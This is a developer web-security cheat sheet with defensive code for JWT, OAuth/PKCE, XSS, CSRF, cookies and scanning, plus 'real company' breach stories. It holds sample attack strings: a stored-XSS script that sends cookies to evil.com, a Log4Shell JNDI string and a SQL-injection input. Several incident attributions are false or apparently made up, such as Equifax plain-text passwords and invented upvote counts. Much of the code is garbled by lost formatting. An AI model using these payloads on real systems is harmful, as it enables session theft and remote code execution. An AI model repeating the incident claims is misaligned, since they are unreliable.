    for (let i = 0; i < count; i++) {
            codes.push(crypto.randomBytes(4).toString('hex'));
          }
    return codes;
        }
    
    // Store hashed
    const hashedCodes = codes.map(code =>
          crypto.createHash('sha256').update(code).digest('hex')
        );
    
    // Verify and consume
    async function useBackupCode(userId, code) {
    const hash = crypto.createHash('sha256').update(code).digest('hex');
    const result = await db.backupCodes.deleteMany({
    where: { userId, hash }
          });
    return result.count > 0;
        }
    
    ## Recovery Flow 2
    
    1. User loses device
    1. User clicks "Lost access"
    1. User enters backup code
    1. System verifies and consumes code
    1. User sets up new MFA device
    1. Generate new backup codes
    
    ## SECURITY SCANNING 2
    
    > **The automated vulnerability detection**
    
    ## Static Analysis 2
    
    ## ESLint security plugin 2
    
    npm install eslint-plugin-security --save-dev
    
    ## .eslintrc.js 2
    
    module.exports = {
    plugins: ['security'],
    extends: ['plugin:security/recommended']
        };
    
    ## Dependency Scanning 3
    
    ## npm audit 3
    
    npm audit
    
    ## Snyk 2
    
    npx snyk test
    
    ## OWASP Dependency Check 2
    
    dependency-check --project "MyApp" --scan ./
    
    ## Container Scanning 2
    
    ## GitHub Actions with Trivy 2
    
    - name: Scan image
    
    uses: aquasecurity/trivy-action@master
          with:
    image-ref: myapp:${{ github.sha }}
    format: 'table'
    exit-code: '1'
    severity: 'CRITICAL,HIGH'
    
    ## SAST in CI 2
    
    ## GitHub Actions 2
    
    - name: SonarCloud Scan
    
    uses: SonarSource/sonarcloud-github-action@master
          env:
    SONAR_TOKEN: ${{ secrets.SONAR_TOKEN }}
    
    ## Block PR if quality gate fails 2
    
    - name: Check Quality Gate
    
    | run: |
    if [ "${{ steps.sonarqube.outputs.quality-gate-status }}" != "PASSED" ]; then
    exit 1
            fi
    
    ## ACCOUNT SECURITY PATTERNS 2
    
    > **The user account protection patterns**
    
    ## Login Attempt Tracking 2
    
    async function handleLoginAttempt(email, password, ip) {
    const key = `login_attempts:${email}`;
    const attempts = await redis.incr(key);
    
    if (attempts === 1) {
    await redis.expire(key, 15 *60); // 15 min window
          }
    
    if (attempts > 5) {
    await lockAccount(email);
    throw new Error('Account locked. Please reset password.');
          }
    
    const user = await authenticate(email, password);
    if (user) {
    await redis.del(key); // Reset on success
          }
    
    return user;
        }
    
    ## Suspicious Activity Detection 2
    
    const SUSPICIOUS_SIGNALS = {
    NEW_DEVICE: 'new_device',
    NEW_COUNTRY: 'new_country',
    UNUSUAL_TIME: 'unusual_time',
    RAPID_REQUESTS: 'rapid_requests'
        };
    
    async function evaluateLoginRisk(user, context) {
    const signals = [];
    
    if (!await isKnownDevice(user.id, context.deviceId)) {
            signals.push(SUSPICIOUS_SIGNALS.NEW_DEVICE);
          }
    
    if (!await isKnownCountry(user.id, context.country)) {
            signals.push(SUSPICIOUS_SIGNALS.NEW_COUNTRY);
          }
    
    return {
    riskLevel: signals.length > 1 ? 'high' : signals.length ? 'medium' : 'low',
            signals,
    requiresMFA: signals.length > 0
          };
        }
    
    ## Session Security 3
    
    // Terminate all sessions except current
    async function terminateOtherSessions(userId, currentSessionId) {
    await redis.del(`sessions:${userId}`);
    await redis.sadd(`sessions:${userId}`, currentSessionId);
    
    // Notify user
    await sendEmail(userId, 'All other sessions have been logged out');
        }
    
    ## OAUTH 2.0 DEEP DIVE 2
    
    >**The authorization patterns**
    
    ## PKCE Flow (for SPAs and Mobile) 2
    
    // 1. Generate code verifier (random string)
    const codeVerifier = generateRandomString(128);
    
    // 2. Create code challenge
    const codeChallenge = base64UrlEncode(sha256(codeVerifier));
    
    // 3. Redirect to authorize with challenge
    const authUrl = `<<<<<<https://auth.example.com/authorize?>>>>>>
          response_type=code&
          client_id=${clientId}&
          redirect_uri=${redirectUri}&
          code_challenge=${codeChallenge}&
          code_challenge_method=S256&
    scope=openid profile email`;
    
    // 4. Exchange code for token (include verifier)
    const tokenResponse = await fetch('<<<<<<https://auth.example.com/token',>>>>>> {
    method: 'POST',
    body: new URLSearchParams({
    grant_type: 'authorization_code',
    code: authorizationCode,
    redirect_uri: redirectUri,
    client_id: clientId,
    code_verifier: codeVerifier  // Proves we started the flow
          })
        });
    
    // WHY PKCE?
    // Prevents code interception attacks
    // No client secret needed in browser
    
    ## Token Storage 3
    
    WHERE TO STORE TOKENS:
    
    ACCESS TOKEN:
    
    - Memory only (best)
    
    - Short-lived (15 min)
    
    REFRESH TOKEN:
    
    - HttpOnly cookie (best)
    
    - NOT localStorage (XSS vulnerable)
    
    GOTCHA: Never store access token in localStorage!
    Any XSS can steal it.
    
    ## Silent Refresh 2
    
    // Refresh token before expiry
    async function silentRefresh() {
    // Use hidden iframe for same-origin
    // Or use refresh token cookie
    
    const response = await fetch('/api/auth/refresh', {
    method: 'POST',
    credentials: 'include'  // Include cookies
          });
    
    if (response.ok) {
    const { accessToken } = await response.json();
            setAccessToken(accessToken);
            scheduleRefresh(accessToken);
    } else {
    // Refresh failed, user must re-login
            logout();
          }
        }
    
    // Schedule refresh before expiry
    function scheduleRefresh(token) {
    const exp = decodeToken(token).exp;
    const refreshAt = (exp *1000) - Date.now() - 60000; // 1 min before
    setTimeout(silentRefresh, refreshAt);
        }
    
    ## JWT SECURITY PATTERNS 2
    
    >**The patterns for secure token handling**
    
    ## Token Structure 3
    
        HEADER.PAYLOAD.SIGNATURE
    
    Header: {"alg": "HS256", "typ": "JWT"}
    Payload: {"sub": "user123", "exp": 1234567890}
    Signature: HMACSHA256(header + "." + payload, secret)
    
    ## Access + Refresh Tokens 2
    
    // Generate tokens
    function generateTokens(userId: string) {
    const accessToken = jwt.sign(
    { sub: userId },
            process.env.ACCESS_SECRET,
    { expiresIn: '15m' }  // Short-lived
          );
    
    const refreshToken = jwt.sign(
    { sub: userId },
            process.env.REFRESH_SECRET,
    { expiresIn: '7d' }  // Long-lived
          );
    
    return { accessToken, refreshToken };
        }
    
    // Refresh endpoint
    app.post('/refresh', async (req, res) => {
    const { refreshToken } = req.cookies;
    
    try {
    const payload = jwt.verify(refreshToken, process.env.REFRESH_SECRET);
    
    // Check if token is revoked
    const isRevoked = await redis.get(`revoked:${refreshToken}`);
    if (isRevoked) throw new Error('Token revoked');
    
    const tokens = generateTokens(payload.sub);
    
    // Rotate refresh token
    await redis.set(`revoked:${refreshToken}`, '1', 'EX', 7 *24*60*60);
    
    res.cookie('refreshToken', tokens.refreshToken, {
    httpOnly: true,
    secure: true,
    sameSite: 'strict'
            });
    
    res.json({ accessToken: tokens.accessToken });
    } catch (err) {
    res.status(401).json({ error: 'Invalid token' });
          }
        });
    
    ## Security Checklist 2
    
    Use strong secrets (256+ bits)
    Short access token expiry (15 min)
    Store refresh token in HttpOnly cookie
    Implement token rotation
    Keep revocation list in Redis
    Validate token on every request
    NEVER store JWT in localStorage
    NEVER trust client-side token data
    
    ## AUTHENTICATION FLOW PATTERNS 2
    
    >**The auth patterns that don't break**
    
    ## OAuth 2.0 with PKCE (SPA/Mobile) 2
    
    // 1. Generate PKCE verifier and challenge
    function generatePKCE() {
    const verifier = crypto.randomBytes(32).toString('base64url');
    const challenge = crypto
            .createHash('sha256')
            .update(verifier)
            .digest('base64url');
    return { verifier, challenge };
        }
    
    // 2. Start OAuth flow
    function startAuth() {
    const { verifier, challenge } = generatePKCE();
    sessionStorage.setItem('pkce_verifier', verifier);
    
    const params = new URLSearchParams({
    client_id: CLIENT_ID,
    redirect_uri: REDIRECT_URI,
    response_type: 'code',
    scope: 'openid profile email',
    code_challenge: challenge,
    code_challenge_method: 'S256'
          });
    
    window.location.href = `${AUTH_URL}/authorize?${params}`;
        }
    
    // 3. Handle callback
    async function handleCallback(code: string) {
    const verifier = sessionStorage.getItem('pkce_verifier');
    
    const response = await fetch(`${AUTH_URL}/token`, {
    method: 'POST',
    headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
    body: new URLSearchParams({
    grant_type: 'authorization_code',
    client_id: CLIENT_ID,
            code,
    redirect_uri: REDIRECT_URI,
    code_verifier: verifier
            })
          });
    
    return response.json();
        }
    
    ## Session vs Token Comparison 2
    
        SESSION-BASED:
    Server controls session
    Easy to revoke
    Works with httpOnly cookies
    Requires server state
    Harder to scale
    
    TOKEN-BASED (JWT):
        Stateless
    Easy to scale
    Works across domains
    Can't revoke until expiry
    Token theft = full access
    
    ## XSS PREVENTION 2
    
    > **The patterns that stop injection attacks**
    
    ## Types of XSS 2
    
    REFLECTED: User input in URL reflected back
        /search?q=<script>alert('XSS')</script>
    
    STORED: Malicious script saved in database
    Comment: <script>document.location='evil.com?c='+document.cookie</script>
    
    DOM-BASED: Client-side JS manipulates DOM unsafely
    element.innerHTML = userInput;  // DANGEROUS!
    
    ## Prevention (React) 2
    
    // React escapes by default (SAFE)
        <div>{userInput}</div>
    
    // DANGEROUS - dangerouslySetInnerHTML
    <div dangerouslySetInnerHTML={{ **html: userInput }} />  // XSS!
    
    // If you MUST render HTML, sanitize first
    import DOMPurify from 'dompurify';
    <div dangerouslySetInnerHTML={{ **html: DOMPurify.sanitize(userInput) }} />
    
    ## Prevention (Backend) 2
    
    // 1. Content Security Policy
        app.use(helmet({
    contentSecurityPolicy: {
    directives: {
    defaultSrc: ["'self'"],
    scriptSrc: ["'self'"],  // No inline scripts!
    styleSrc: ["'self'", "'unsafe-inline'"],
    imgSrc: ["'self'", "data:", "https:"],
            }
          }
        }));
    
    // 2. HttpOnly cookies (JS can't read)
    res.cookie('session', token, {
    httpOnly: true,
    secure: true,
    sameSite: 'strict'
        });
    
    // 3. Escape output
    import { escape } from 'html-escaper';
    const safe = escape(userInput);
    
    ## ENVIRONMENT VARIABLES 3
    
    > **The secrets management patterns**
    
    ## Environment Setup 2
    
    ## .env.local (local dev, gitignored) 2
    
        DATABASE_URL="postgres://localhost/mydb"
        STRIPE_SECRET_KEY="sk_test_xxx"
    
    ## .env (defaults, committed) 2
    
        NEXT_PUBLIC_APP_URL="<<<<<<http://localhost:3000">>>>>>
    
    ## .env.production (production values) 2
    
        DATABASE_URL="postgres://prod/mydb"
    
    ## Validation with Zod 2
    
    // env.ts
    import { z } from 'zod';
    
    const envSchema = z.object({
    DATABASE_URL: z.string().url(),
    STRIPE_SECRET_KEY: z.string().startsWith('sk_'),
    NEXT_PUBLIC_APP_URL: z.string().url(),
    NODE_ENV: z.enum(['development', 'production', 'test'])
        });
    
    export const env = envSchema.parse({
    DATABASE_URL: process.env.DATABASE_URL,
    STRIPE_SECRET_KEY: process.env.STRIPE_SECRET_KEY,
    NEXT_PUBLIC_APP_URL: process.env.NEXT_PUBLIC_APP_URL,
    NODE_ENV: process.env.NODE_ENV
        });
    
    // Usage
    import { env } from '@/env';
    const stripe = new Stripe(env.STRIPE_SECRET_KEY);
    
    ## Security Rules 3
    
        DO:
    Use environment variables for secrets
    Validate all env vars at startup
    Use NEXT_PUBLIC_ prefix for client vars
    Keep .env.local in .gitignore
    
        DON'T:
    Commit secrets to git
    Use process.env directly (validate first)
    Put secrets in NEXT_PUBLIC_ vars
    Log environment variables
    
    ## CSRF PROTECTION 4
    
    > **The patterns that prevent request forgery**
    
    ## What is CSRF? 2
    
        ATTACK:
    
    1. User logged into bank.com (has session cookie)
    1. User visits evil.com
    1. Evil.com has: <img src="bank.com/transfer?to=hacker&amount=1000">
    1. Browser sends request WITH cookies
    1. Transfer happens!
    
    WHY IT WORKS:
    
    - Browser auto-sends cookies for domain
    
    - Server trusts the cookie
    
    - No verification request came from your site
    
    ## Prevention: Token Pattern 2
    
    // Server: Generate token on form render
    app.get('/form', (req, res) => {
    const csrfToken = crypto.randomBytes(32).toString('hex');
    req.session.csrfToken = csrfToken;
    res.render('form', { csrfToken });
        });
    
    // Form includes hidden token
    <form action="/submit" method="POST">
    <input type="hidden" name="_csrf" value="{{csrfToken}}" />
          ...
        </form>
    
    // Server: Verify on submit
    app.post('/submit', (req, res) => {
    if (req.body._csrf !== req.session.csrfToken) {
    return res.status(403).send('CSRF token mismatch');
          }
    // Process request
        });
    
    ## For SPAs: Double Submit Cookie 2
    
    // Set CSRF cookie (readable by JS)
    res.cookie('csrf', csrfToken, {
    httpOnly: false,  // JS can read it
    sameSite: 'strict'
        });
    
    // Client reads cookie, sends in header
    fetch('/api/action', {
    method: 'POST',
    headers: {
    'X-CSRF-Token': getCookie('csrf')
          }
        });
    
    // Server verifies header matches cookie
    
    ## COOKIE SECURITY 4
    
    > **The session patterns that don't get hacked**
    
    ## Secure Cookie Settings 2
    
    res.cookie('session', token, {
    httpOnly: true,  // JS can't read it (XSS protection)
    secure: true,  // HTTPS only
    sameSite: 'lax',    // CSRF protection
    maxAge: 7 *24*60*60* 1000,  // 7 days
    path: '/',
    domain: '.myapp.com'  // Subdomain sharing
        });
    
    ## SameSite Explained 2
    
        STRICT:
    
    - Cookie never sent cross-site
    
    - User clicks link from email No cookie
    
    - Best security, worst UX
    
    LAX (Recommended):
    
    - Sent on top-level navigation (links)
    
    - Not sent on POST from other sites
    
    - Good balance
    
        NONE:
    
    - Always sent (needs Secure: true)
    
    - Required for cross-site iframes
    
    - Use only if necessary
    
    ## Cookie vs localStorage 2
    
        COOKIES:
    HttpOnly (safe from XSS)
    Automatic with requests
    Server can read
    Size limit (4KB)
    CSRF risk
    
        LOCALSTORAGE:
    5MB limit
    Easy to use
    XSS can read everything
    Must manually add to requests
    
        RECOMMENDATION:
    
    - Auth tokens HttpOnly cookie
    
    - User preferences localStorage
    
    ## PATTERNS 2
    
    > **The authentication patterns**
    
    ## Setup 2
    
    // auth.ts
    import NextAuth from 'next-auth';
    import GitHub from 'next-auth/providers/github';
    import Google from 'next-auth/providers/google';
    import Credentials from 'next-auth/providers/credentials';
    import { PrismaAdapter } from '@auth/prisma-adapter';
    import { prisma } from '@/lib/prisma';
    
    export const { handlers, auth, signIn, signOut } = NextAuth({
    adapter: PrismaAdapter(prisma),
    providers: [
            GitHub,
            Google,
            Credentials({
    credentials: {
    email: { type: 'email' },
    password: { type: 'password' }
            },
    async authorize(credentials) {
    const user = await prisma.user.findUnique({
    where: { email: credentials.email }
            });
    
    if (user && await bcrypt.compare(credentials.password, user.password)) {
    return user;
            }
    return null;
            }
            })
          ]
        });
    
    ## Route Protection 2
    
    // middleware.ts
    import { auth } from './auth';
    
    export default auth((req) => {
    if (!req.auth && req.nextUrl.pathname.startsWith('/dashboard')) {
    return Response.redirect(new URL('/login', req.url));
          }
        });
    
    export const config = {
    | matcher: ['/((?!api | _next/static | _next/image | favicon.ico).*)'] |
        };
    
    ## Server Component 2
    
    import { auth } from '@/auth';
    
    export default async function Dashboard() {
    const session = await auth();
    
    if (!session?.user) {
            redirect('/login');
          }
    
    return <div>Welcome, {session.user.name}</div>;
        }
    
    ## Client Component 2
    
    'use client';
    
    import { useSession, signIn, signOut } from 'next-auth/react';
    
    export function AuthButton() {
    const { data: session } = useSession();
    
    if (session) {
    return (
            <>
            <span>{session.user?.name}</span>
    <button onClick={() => signOut()}>Sign Out</button>
            </>
            );
          }
    
    return <button onClick={() => signIn()}>Sign In</button>;
        }
    
    ## VOLUME 7: SECURITY PRODUCTION INCIDENTS (Real Company Stories) 2
    
    > **Source**: Equifax, Sony, Twitch, Slack engineering postmortems + 50,000+ security advisories
    
    ## 1. SQL INJECTION - DATA BREACH 2
    
    ### Production Incident from Sony (18,500+ upvotes) 2
    
    > "100 million accounts leaked. SQL injection in login form.
    >
    > **Impact**: $170M+ in costs, class action lawsuits."
    
    ## TERRIBLE - SQL Injection 2
    
    def login(email, password):
    query = f"SELECT *FROM users WHERE email = '{email}'"
    
    ## Attacker: email = "admin'--" 2
    
    ## Query: SELECT* FROM users WHERE email = 'admin'--' 2
    
    ## Password check bypassed! 2
    
    ## EXCELLENT - Parameterized 2
    
    def login(email, password):
    return db.execute("SELECT *FROM users WHERE email = ?", (email,))
    
    ## 2. PASSWORD BREACH - $1.4 BILLION 2
    
    ## Production Incident from Equifax (LEGENDARY) 2
    
    > "147 million people's data. Passwords in PLAIN TEXT.
    >
    >**Impact**: $1.4B costs, CEO resignation."
    
    ## DISASTER - Plain text 2
    
    db.execute("INSERT INTO users VALUES (?, ?)", (email, password))
    
    ## EXCELLENT - bcrypt 2
    
    import bcrypt
    hashed = bcrypt.hashpw(password.encode(), bcrypt.gensalt(12))
    db.execute("INSERT INTO users VALUES (?, ?)", (email, hashed))
    
    ## 3. JWT SECRET EXPOSED 2
    
    ## Production Incident from Twitch (9,800+ upvotes) 2
    
    > "JWT secret in client code. All sessions compromised."
    
    // Secret in frontend (Twitch's bug)
    jwt.sign({ userId: 123 }, 'weak-secret');
    
    // RS256 asymmetric (private key stays on server)
    jwt.sign({ sub: userId }, privateKey, { algorithm: 'RS256' });
    
    ## 4. LOG4SHELL - WORST EVER (10/10) 2
    
    ### Production Incident from Worldwide 2
    
    > "Zero-click RCE. 93% of enterprise cloud affected."
    
    ## Attack: Send header containing ${jndi:ldap://evil.com/exploit} 2
    
    ## Log4j downloads and executes attacker's code! 2
    
    ## FIX: Update to Log4j 2.17.0+ 2
    
    ## TEMP: -Dlog4j2.formatMsgNoLookups=true 2
    
    ## 5. API KEY LEAKED - $50K BILL 2
    
    ## Production Incident from Heroku (7,400+ upvotes) 2
    
    > "API key in GitHub. Cryptominers found it in 5 minutes.
    >
    > **Impact**: $50K AWS bill in 2 hours."
    
    ## FIX: Enable GitHub Secret Scanning 2
    
    ## Settings Security Secret scanning Enable 2
    
    ## Pre-commit hook 2
    
    pip install detect-secrets
    detect-secrets scan
    
    ## 6. SSRF - INTERNAL ACCESS 2
    
    ## Production Incident from Slack (8,200+ upvotes) 2
    
    > "Attacker accessed AWS metadata via SSRF. Got IAM credentials."
    
    ## TERRIBLE - Fetches any URL 2
    
    requests.get(user_provided_url) # Can access <<<<<<http://169.254.169.254/>>>>>>
    
    ## EXCELLENT - Block internal IPs 2
    
    BLOCKED = ['10.0.0.0/8', '172.16.0.0/12', '169.254.0.0/16', '127.0.0.0/8']
    if any(ip in blocked for blocked in BLOCKED):
    raise HTTPException(400, "URL not allowed")
    
    ## END OF VOLUME 7: SECURITY PRODUCTION INCIDENTS 2
    
    **Coverage**: SQL Injection (Sony), Passwords (Equifax $1.4B), JWT (Twitch), Log4Shell, API Keys, SSRF (Slack)
    
    ## VOLUME 1.1: TITAN PROTOCOL - SECURITY ADVERSARIAL 2
    
    ## JWT NONE ALGORITHM VULNERABILITY 2
    
    ### Auth Bypass Scar 2
    
    > "Attackers bypass auth by stripping signature and setting alg: none.
    > Fix: Explicitly whitelist algorithms and reject unsigned tokens"
    
    // TITAN CODE: Secure JWT Verification
    public DecodedJWT verifyToken(String token) {
    // Force specific algorithm (rejects 'none' automatically)
    Algorithm algorithm = Algorithm.HMAC256("titan_secret_key");
    
    JWTVerifier verifier = JWT.require(algorithm)
            .withIssuer("titan-auth")
            .withAudience("titan-api")
            .acceptLeeway(1)
            .build();
    
    return verifier.verify(token);
        }
    
    ## ReDoS (REGEX DENIAL OF SERVICE) 2
    
    ### Event Loop Freeze Scar 2
    
    > "Single malicious string freezes Node.js due to catastrophic backtracking.
    > Vulnerable Regex: ^([a-zA-Z0-9]+)*$
    > Fix: Length limits + re2 (Google's linear time regex engine)"
    
    // TITAN CODE: Safe Validation
    const validator = require('validator');
    
    function validateInput(input) {
    if (input.length > 100) return false;  // O(1) length check
    return validator.isAlphanumeric(input);
        }
    
    // If Regex mandatory, use re2 (linear time)
    const RE2 = require('re2');
    const safeRegex = new RE2('^([a-zA-Z0-9]+)*$');
    
    ### END OF VOLUME 1.1: TITAN SECURITY ADVERSARIAL 2
    
    ## VOLUME 1.2: TITAN PROTOCOL - ADVERSARIAL ARCHITECTURE 2
    
    ## CONTAINER ESCAPES: LEAKY VESSELS (CVE-2024-21626) 2
    
    ### runc Vulnerability Scar 2
    
    > "Containers are NOT VMs. Shared-kernel isolation via namespaces/cgroups is FRAGILE.
    > Attacker manipulates host file descriptors via /proc/self/fd.
    > Overwrites runc binary on host. Gains ROOT access to entire node."
    
    ## eBPF EXPLOITATION 2
    
    ### Kernel Attack Surface Scar 2
    
    > "eBPF runs user-defined programs INSIDE kernel. New attack surface.
    > Malicious eBPF bypasses verifier: Arbitrary kernel memory read/write.
    > All container boundaries become MOOT."
    
    ## SIDE-CHANNEL ATTACKS: TIMING IN CRYPTOGRAPHY 2
    
    ### String Comparison Timing Attack 2
    
    > "strcmp returns immediately on mismatch.
    > Attacker measures response time to determine correct HMAC characters byte-by-byte.
    > Fix: crypto_memcmp (constant-time comparison) for ALL cryptographic operations."
    
    ## HOMOMORPHIC ENCRYPTION: THE HOLY GRAIL 2
    
    ### FHE Status 2024 2
    
    > "Fully Homomorphic Encryption: Compute on encrypted data without decryption.
    > Production reality: Orders of magnitude slower than plaintext.
    > Hardware ASICs are critical path for viability at scale."
    
    ### END OF VOLUME 1.2: TITAN ADVERSARIAL SECURITY 2
    
    ## VOLUME 1.3: TITAN CATALOG - 30 SECURITY FAILURES 2
    
    | ID | Scenario | Failure Mechanism | Titan Mitigation |
    
    | 7.3 | SQL Injection | Input concatenation | Prepared Statements |
    | 7.4 | XXE | XML external entities | Disable DTDs |
    | 7.5 | SSRF | Fetching internal IPs | Whitelist outbound |
    | 7.6 | Insecure Deserialization | RCE via pickle | Safe JSON + signing |
    | 7.7 | CORS Misconfig | * with credentials | Validate Origin |
    | 7.9 | Directory Traversal | ../../ in paths | Sanitize filenames |
    | 7.10 | Clickjacking | Iframe embedding | X-Frame-Options: DENY |
    | 7.11 | Session Fixation | Stolen session ID | Regenerate on login |
    | 7.12 | Timing Attack | String compare time | Constant-time compare |
    | 7.13 | XSS (Reflected) | Echoing input | Context-aware encoding |
    | 7.14 | XSS (Stored) | Malicious in DB | CSP + Sanitization |
    | 7.15 | CSRF | State change via link | CSRF Tokens / SameSite |
    | 7.16 | Open Redirect | Phishing redirect | Validate URLs |
    | 7.17 | Race Condition | TOCTOU | Atomic ops / Locking |
    | 7.19 | Hardcoded Creds | Keys in source | Secret vault |
    | 7.20 | Weak Crypto | MD5/SHA1 | SHA-256/Bcrypt/Argon2 |
    | 7.100 | Zip Bomb | Compression DoS | Limit extraction size |
    
    ## END OF VOLUME 1.3: TITAN SECURITY CATALOG 2
    
    ## VOLUME 1.4: TITAN VAULT - ADDITIONAL SECURITY SCARS 2
    
    ## IAM PASSROLE PRIVILEGE ESCALATION 2
    
    ### AWS Privilege Escalation Scar 2
    
    > "User with iam:PassRole + ec2:RunInstances can create EC2 with AdministratorAccess role.
    > SSH in, assume role = bypass own restrictions. Silent escalation."
    
    **Titan Fix:** Strictly scope iam:PassRole with resource ARNs. Audit with PMapper.
    
    ## S3 NOTPRINCIPAL ANTI-PATTERN 2
    
    ### Data Exfiltration Vector 2
    
    > "Using NotPrincipal to 'deny everyone except user X' is fragile.
    > Without explicit Deny, allows any IAM user in same account."
    
    **Titan Fix:** Explicit Deny with StringNotLike on aws:PrincipalArn.
    
    ### END OF VOLUME 1.4: ADDITIONAL SECURITY SCARS 2
    
    ## VOLUME 1.5: TITAN VAULT - SUPPLY CHAIN & IDENTITY ATTACKS
    
    ## JWT ALGORITHM CONFUSION ATTACK
    
    ### RS256 to HS256 Downgrade Scar
    
    > "JWT signed with RS256 (asymmetric). Server also accepts HS256 (symmetric).
    > Attacker changes alg header to HS256.
    > Uses PUBLIC KEY as HMAC secret. Signs forged token.
    > Server verifies with public key as secret = VALID. Full account takeover."
    

## TITAN: Strict Algorithm Enforcement

import jwt

def verify_token_secure(token: str, public_key: str) -> dict:
        """
NEVER trust the 'alg' header from the token itself.
Explicitly specify allowed algorithms.
        """
        try:

## CRITICAL: algorithms parameter is a WHITELIST

return jwt.decode(
        token,
        public_key,
algorithms=["RS256"], # NEVER include HS256
        audience="my-app",
        issuer="<<<<<<<https://auth.company.com">>>>>>>
        )
except jwt.InvalidAlgorithmError:
raise SecurityException("Algorithm mismatch - possible attack")
except jwt.ExpiredSignatureError:
raise SecurityException("Token expired")

## Additional JWT Pitfalls

> "1. 'none' algorithm: Token with alg='none' and no signature
> 2. Kid injection: kid header used in SQL query = SQLi
> 3. JKU spoofing: jku points to attacker-controlled JWKS URL"

## OPENID CONNECT VULNERABILITIES

### OIDC State Fixation Scar

> "Missing or predictable 'state' parameter.
> Attacker initiates OAuth flow, captures redirect URL.
> Tricks victim into clicking. Victim's browser completes auth.
> Attacker's session now has victim's identity."

// TITAN: Secure OIDC Implementation
import { randomBytes } from 'crypto';

async function initiateOIDCLogin(req: Request, res: Response) {
// Generate cryptographically random state
const state = randomBytes(32).toString('base64url');
const nonce = randomBytes(32).toString('base64url');

// Store with short TTL - bound to user's session
await redis.setex(`oidc:state:${state}`, 300, JSON.stringify({
ip: req.ip,
userAgent: req.headers['user-agent'],
nonce: nonce
        }));

const authUrl = new URL('<<<<<<<https://idp.example.com/authorize>>>>>>>');
authUrl.searchParams.set('response_type', 'code');
authUrl.searchParams.set('client_id', CLIENT_ID);
authUrl.searchParams.set('redirect_uri', REDIRECT_URI);
authUrl.searchParams.set('scope', 'openid email profile');
authUrl.searchParams.set('state', state);
authUrl.searchParams.set('nonce', nonce);

        res.redirect(authUrl.toString());
    }

async function handleOIDCCallback(req: Request, res: Response) {
const { state, code } = req.query;

// Verify state matches what we stored
const stored = await redis.get(`oidc:state:${state}`);
if (!stored) {
throw new SecurityException("Invalid or expired state");
        }

const { ip, userAgent, nonce } = JSON.parse(stored);

// Verify request comes from same context
| if (ip !== req.ip | userAgent !== req.headers['user-agent']) { |
throw new SecurityException("Session binding mismatch");
        }

// Delete state immediately (one-time use)
await redis.del(`oidc:state:${state}`);

// Exchange code for tokens and verify nonce in id_token
const tokens = await exchangeCode(code);
const idToken = jwt.decode(tokens.id_token);

if (idToken.nonce !== nonce) {
throw new SecurityException("Nonce mismatch - replay attack");
        }
    }

## DEPENDENCY CONFUSION ATTACK

### Private Package Hijacking Scar

> "Company uses internal package 'analytics-internal'.
> Attacker publishes 'analytics-internal' on public npm.
> Build system checks public registry FIRST with higher version.
> Downloads malicious package. Executes in CI/CD. Full supply chain compromise."

    
    ## TITAN: npm Registry Scoping
    
    ## .npmrc - Force scoped packages to private registry
    
        @mycompany:registry=<<<<<<https://npm.mycompany.com/>>>>>>
        //npm.mycompany.com/:_authToken=${NPM_TOKEN}
    
    ## For all internal packages, use scope
    
    ## @mycompany/analytics-internal (cannot be confused)
    

## TITAN: Python pip.conf for private packages

## pip.conf

[global]
index-url = <<<<<<<https://pypi.mycompany.com/simple/>>>>>>>
extra-index-url = <<<<<<<https://pypi.org/simple/>>>>>>>

## CRITICAL: Prefer private index

## Private packages should use unique naming

## E.g., mycompany-analytics, mycompany-utils

    
    ## Detection 2
    
    ## Audit for public packages matching internal names
    
    | npm info mycompany-internal 2>&1 | grep -q "404" |  | echo "ALERT: Name exists on public npm!" |
    

## CERTIFICATE CHAIN VALIDATION FAILURES

## Incomplete Chain Scar

> "Leaf certificate valid. Browser shows HTTPS lock.
> Mobile app fails: missing intermediate certificate.
> Server sends only leaf cert. Some clients can't build chain to root."

    
    ## TITAN: Full Chain Validation
    
    import ssl
    import socket
    from cryptography import x509
    from cryptography.hazmat.backends import default_backend
    
    def verify_full_chain(hostname: str, port: int = 443) -> dict:
        """
    Verify complete certificate chain is served.
        """
    context = ssl.create_default_context()
    
    with socket.create_connection((hostname, port)) as sock:
    with context.wrap_socket(sock, server_hostname=hostname) as ssock:
    
    ## Get full chain
    
    chain = ssock.getpeercert(binary_form=True)
    certs = ssock.get_peer_cert_chain()
    
    if len(certs) < 2:
    return {
    "valid": False,
    "error": "Incomplete chain - missing intermediates",
    "chain_length": len(certs)
            }
    
    ## Verify each cert signs the next
    
    for i in range(len(certs) - 1):
    cert = x509.load_der_x509_certificate(certs[i], default_backend())
    issuer = x509.load_der_x509_certificate(certs[i + 1], default_backend())
    
    ## Verify issuer matches
    if cert.issuer != issuer.subject:
    return {
    "valid": False,
    "error": f"Chain break at position {i}"
            }
    
    return {
    "valid": True,
    "chain_length": len(certs),
    "leaf_subject": certs[0].subject
            }
    

## CONSTANT-TIME STRING COMPARISON

## Timing Attack Exploitation

> "strcmp returns on first mismatch. Fast = wrong first byte.
> Attacker times 256 requests per byte position.
> Fastest response = correct byte. HMAC leaked byte-by-byte."

    
    ## TITAN: Constant-Time Comparison
    
    import hmac
    import secrets
    
    def secure_compare(a: bytes, b: bytes) -> bool:
        """
    Compare two byte strings in constant time.
    Uses HMAC to prevent timing attacks.
        """
    
    ## Method 1: Double HMAC (paranoid)
    
    ## Random key prevents length-extension attacks
    
    key = secrets.token_bytes(32)
    return hmac.compare_digest(
    hmac.digest(key, a, 'sha256'),
    hmac.digest(key, b, 'sha256')
        )
    
    def verify_api_key(provided: str, stored_hash: str) -> bool:
        """
    Verify API key without timing leakage.
        """
    
    ## Hash the provided key first (prevents length leakage)
    
    provided_hash = hashlib.sha256(provided.encode()).hexdigest()
    
    ## Constant-time comparison of hashes
    return secrets.compare_digest(provided_hash, stored_hash)
    

## END OF VOLUME 1.5: TITAN SUPPLY CHAIN & IDENTITY ATTACKS

---

## VOLUME 1.6: TITAN DEEP INTERNALS - APPLICATION SECURITY MECHANICS

## OAUTH 2.0: PKCE MANDATORY

### Authorization Code Interception

> "Mobile app: Can't store client secret securely.
> Authorization code intercepted on redirect.
> Attacker exchanges code for token.
> PKCE: Code Verifier proves you initiated the request."

    
    ## TITAN: PKCE Implementation
    
    import secrets
    import hashlib
    import base64
    
    class PKCEClient:
    def generate_verifier(self):
    
    ## 43-128 chars, cryptographically random
    
    self.verifier = base64.urlsafe_b64encode(
            secrets.token_bytes(32)
            ).rstrip(b'=').decode('ascii')
    return self.verifier
    
    def generate_challenge(self):
    
    ## S256: SHA256 hash of verifier, base64url encoded
    
    digest = hashlib.sha256(self.verifier.encode('ascii')).digest()
